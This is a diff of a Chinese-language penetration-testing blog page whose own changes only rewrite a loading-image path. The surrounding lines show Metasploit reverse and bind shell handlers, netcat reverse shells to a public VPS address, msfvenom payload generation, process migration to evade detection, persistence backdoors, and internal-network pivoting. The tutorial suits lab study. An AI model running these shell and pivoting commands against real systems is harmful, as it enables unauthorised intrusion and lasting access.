@@ -90,7 +90,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/common/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -359,14 +359,14 @@
 <p><strong>MSF接受</strong>(仅参考，不建议)</p>
 <figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">use exploit/multi/handler</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">set</span> payloads linux/x64/meterpreter_reverse_tcp</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">set</span> LHOST <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.105</span>      <span class="hljs-comment">#监听主机ip地址</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">set</span> LPORT <span class="hljs-number">9999</span>                  <span class="hljs-comment">#监听主机端口号</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">exploit -j</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/15/nfxFOsYaUuQZ1y7.png" srcset="/img/loading.gif" lazyload alt="image-20220110230250597"></p>
+<p><img src="https://s2.loli.net/2022/01/15/nfxFOsYaUuQZ1y7.png" srcset="/img/common/loading.gif" lazyload alt="image-20220110230250597"></p>
 <p>连接成功后输入命令查看seesion列表,</p>
 <figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">sessions -l</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/15/x8PdunkchVmpwEv.png" srcset="/img/loading.gif" lazyload alt="image-20220110230746809"></p>
+<p><img src="https://s2.loli.net/2022/01/15/x8PdunkchVmpwEv.png" srcset="/img/common/loading.gif" lazyload alt="image-20220110230746809"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 与session 1交互</span><br><span class="hljs-attribute">sessions</span> -i <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/15/VUfav1LCBAmOhPK.png" srcset="/img/loading.gif" lazyload alt="image-20220110231139165"></p>
+<p><img src="https://s2.loli.net/2022/01/15/VUfav1LCBAmOhPK.png" srcset="/img/common/loading.gif" lazyload alt="image-20220110231139165"></p>
 <h4 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h4><p>反向shell:</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">1.1.1.1</span> <span class="hljs-number">9999</span> -e /bin/bash	// Linux正向连接公网vps<span class="hljs-number">1.1.1.1</span>的<span class="hljs-number">9999</span>端口<br><span class="hljs-attribute">nc</span> <span class="hljs-number">1.1.1.1</span> <span class="hljs-number">9999</span> -e c:\windows\system32\cmd.exe  // Windows<br></code></pre></td></tr></table></figure>
 
@@ -435,7 +435,7 @@
 <p>监听设置 <code>use exploit/multi/handler</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> lport 6666<br><span class="hljs-built_in">set</span> rhost 10.0.20.99<br>options<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/3720674e66174d46924ed5d55f4a4b49.png" srcset="/img/loading.gif" lazyload alt="image-20220315092838820"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/3720674e66174d46924ed5d55f4a4b49.png" srcset="/img/common/loading.gif" lazyload alt="image-20220315092838820"></p>
 <p><strong>msf反向连接</strong></p>
 <p>生成msf反向木马</p>
 <p>LHOST设置为windowss7的内网ip地址：LHOST 10.0.20.98</p>
@@ -446,16 +446,16 @@
 
 <h3 id="生成nc反弹shell命令"><a href="#生成nc反弹shell命令" class="headerlink" title="生成nc反弹shell命令"></a>生成nc反弹shell命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_netcat <span class="hljs-attribute">lhost</span>=192.168.56.105 <span class="hljs-attribute">lport</span>=6666 R<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/6c191a28190d45c4b7be86be7129179a.png" srcset="/img/loading.gif" lazyload alt="image-20220719165322147"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/6c191a28190d45c4b7be86be7129179a.png" srcset="/img/common/loading.gif" lazyload alt="image-20220719165322147"></p>
 <h3 id="监听端口建立会话"><a href="#监听端口建立会话" class="headerlink" title="监听端口建立会话"></a><strong>监听端口建立会话</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">msf使用侦听模块</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash">use exploit/multi/handler</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里的payload与生成shell所用payload要一致，这里以linux为例</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> LHOST 192.168.56.105</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> LPORT 6666</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">exitonsession <span class="hljs-literal">false</span>可以让建立监听的端口继续保持侦听。可以接受多个session</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-j为后台任务，-z为持续监听</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash">exploit -j -z</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">显示所有已连接shell</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash">sessions</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入<span class="hljs-built_in">id</span>为1的shell</span><br><span class="hljs-meta prompt_">msf&gt; </span><span class="language-bash">sessions 1</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/ac5c403384d3448ba0a8f15031b986b6.png" srcset="/img/loading.gif" lazyload alt="image-20220124101346878"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/ef3c64ddb3654ab6b83b32ee0fd3651a.png" srcset="/img/loading.gif" lazyload alt="image-20220124102012452"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/ac5c403384d3448ba0a8f15031b986b6.png" srcset="/img/common/loading.gif" lazyload alt="image-20220124101346878"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/ef3c64ddb3654ab6b83b32ee0fd3651a.png" srcset="/img/common/loading.gif" lazyload alt="image-20220124102012452"></p>
 <h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p><strong>进程迁移</strong></p>
 <p>获得shell时，该shell是极其脆弱，所以需要移动这个shell把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样使渗透更难被检测到。自动迁移进程命令（run post&#x2F;windows&#x2F;manage&#x2F;migrate）或手动迁移（migrate PID），系统会自动寻找合适的进程然后迁移</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="language-bash"> post/windows/manage/migrate</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/043ba2a8dd5747c2a5ac37a0dc976f17.png" srcset="/img/loading.gif" lazyload alt="image-20220320204550384"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/043ba2a8dd5747c2a5ac37a0dc976f17.png" srcset="/img/common/loading.gif" lazyload alt="image-20220320204550384"></p>
 <p>可以看到权限迁移至notepad.exe</p>
 <p><strong>权限维持</strong></p>
 <p>使用netaspoit自带的后门进行权限维持，-X以指定的方式开机自启动，-i反向链接的时间间隔，-r攻击者的IP</p>
@@ -467,7 +467,7 @@
 <p><strong>扫描存活主机</strong></p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/windows/gather/arp_scanner<br><span class="hljs-keyword">set</span> session 1<br><span class="hljs-keyword">set</span> rhost 10.0.20.1-254<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/8fb89e511163431b84fc5c019fab20d8.png" srcset="/img/loading.gif" lazyload alt="image-20220321142816445"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/8fb89e511163431b84fc5c019fab20d8.png" srcset="/img/common/loading.gif" lazyload alt="image-20220321142816445"></p>
 <p><strong>扫描目标端口</strong></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> ports <span class="hljs-number">22</span>-<span class="hljs-number">500</span>,<span class="hljs-number">8000</span>-<span class="hljs-number">10000</span><br><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">10.0.20.99</span><br><span class="hljs-attribute">threads</span> <span class="hljs-number">50</span><br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure>
 
@@ -478,7 +478,7 @@
 <p>background退出当前会话，通过会话1，转发172.17.0.0这个路由</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 添加路由至本地</span><br>msf&gt;<span class="hljs-built_in"> route </span><span class="hljs-built_in">add</span> 172.17.0.0 255.255.0.0 1<br><span class="hljs-comment"># 打印当前路由信息</span><br>msf&gt;<span class="hljs-built_in"> route </span>print<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/a41f53da34a448909d19fe239f3e6561.png" srcset="/img/loading.gif" lazyload alt="image-20220124113643605"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/a41f53da34a448909d19fe239f3e6561.png" srcset="/img/common/loading.gif" lazyload alt="image-20220124113643605"></p>
 <p>到这里 pivot 已经配置好了，在 <strong>msf</strong> 里对 172.17.0.1 进行扫描(db_nmap)或者访问(psexe 模块，ssh 模块等)将自动代理 session 2 这个会话来访。</p>
 <p><strong>使用msf自动添加路由</strong></p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">msf6 &gt; <span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manage/autoroute<br>meterpreter &gt; <span class="hljs-keyword">run</span> <span class="hljs-keyword">post</span>/multi/manage/autoroute<br></code></pre></td></tr></table></figure>
@@ -491,7 +491,7 @@
 <p>默认是开放在本机1080端口上，也可以自己修改</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 修改版本、地址、端口</span><br>msf &gt; <span class="hljs-built_in">set</span> version 4a<br>msf &gt; <span class="hljs-built_in">set</span> srvhost 192.168.56.105<br>msf &gt; <span class="hljs-built_in">set</span> srvport 1080<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/ff4b19e2544441aa95abd10d2b9e6452.png" srcset="/img/loading.gif" lazyload alt="image-20220124114103606"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/ff4b19e2544441aa95abd10d2b9e6452.png" srcset="/img/common/loading.gif" lazyload alt="image-20220124114103606"></p>
 
                 
               </div>
